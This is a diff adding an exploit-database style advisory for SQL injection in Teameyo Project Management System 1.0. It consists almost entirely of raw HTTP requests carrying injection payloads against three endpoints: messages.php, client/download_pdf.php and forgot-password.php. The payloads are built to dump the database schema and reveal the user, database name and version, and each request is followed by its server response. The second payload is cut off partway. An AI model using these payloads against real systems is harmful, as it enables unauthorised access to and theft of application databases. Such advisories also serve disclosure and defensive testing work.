@@ -1,0 +1,96 @@
+# Exploit Title: Teameyo - Project Management System 1.0 - SQL Injection
+# Dork: N/A
+# Date: 2019-01-28
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://www.teameyo.com/
+# Software Link: https://codecanyon.net/item/teameyo-project-management-system/23142804
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/messages.php?project_id=[SQL]
+# 
+
+GET /[PATH]/messages.php?project_id=-48%27%20union%20select%20(selECt(@x)fROm(selECt(@x:=0x00)%2c(@rUNNing_nuMBer:=0)%2c(@tbl:=0x00)%2c(selECt(0)fROm(infoRMATion_schEMa.coLUMns)wHEre(tABLe_schEMa=daTABase())aNd(0x00)in(@x:=Concat(@x%2cif((@tbl!=tABLe_name)%2cConcat(LPAD(@rUNNing_nuMBer:=@rUNNing_nuMBer%2b1%2c2%2c0x30)%2c0x303d3e%2c@tBl:=tABLe_naMe%2c(@z:=0x00))%2c%200x00)%2clpad(@z:=@z%2b1%2c2%2c0x30)%2c0x3d3e%2c0x4b6f6c6f6e3a20%2ccolumn_name%2c0x3c62723e))))x)--%20- HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=1ug6oq40f09kft3jqncc4pco71
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+HTTP/1.1 200 OK
+Server: nginx
+Date: Sun, 27 Jan 2019 17:29:54 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+X-Powered-By: PHP/7.2.14, PleskLin
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/client/download_pdf.php
+# 
+
+POST /[PATH]/client/download_pdf.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 340
+Cookie: PHPSESSID=1ug6oq40f09kft3jqncc4pco71
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+milestone_id=%31%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32%2c(SELECT(@x)FROM(SELECT(@x: =0x00),(@NR
+HTTP/1.1 200 OK
+Server: nginx
+Date: Sun, 27 Jan 2019 17:37:03 GMT
+Content-Type: application/pdf
+Transfer-Encoding: chunked
+Connection: keep-alive
+Cache-Control: private, must-revalidate, post-check=0, pre-check=0, max-age=1
+Pragma: public
+Expires: Sat, 26 Jul 1997 05:00:00 GMT
+Last-Modified: Sun, 27 Jan 2019 17:37:03 GMT
+Content-Disposition: inline; filename="invoice.pdf"
+X-Powered-By: PHP/7.2.14, PleskLin
+
+# POC: 
+# 3)
+# http://localhost/[PATH]/forgot-password.php 
+# 
+
+POST /[PATH]/forgot-password.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 298
+Cookie: PHPSESSID=1ug6oq40f09kft3jqncc4pco71
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+email=12'||(SeleCT%20'Efe'%20FroM%20duAL%20WheRE%20110=110%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),ConCAT(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(SeLEct%20(ELT(112=112,1))),FLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x)a))||'&forgot-password=FORGET%2BPASSWORD: undefined
+HTTP/1.1 200 OK
+Server: nginx
+Date: Sun, 27 Jan 2019 17:44:33 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+X-Powered-By: PHP/7.2.14, PleskLin
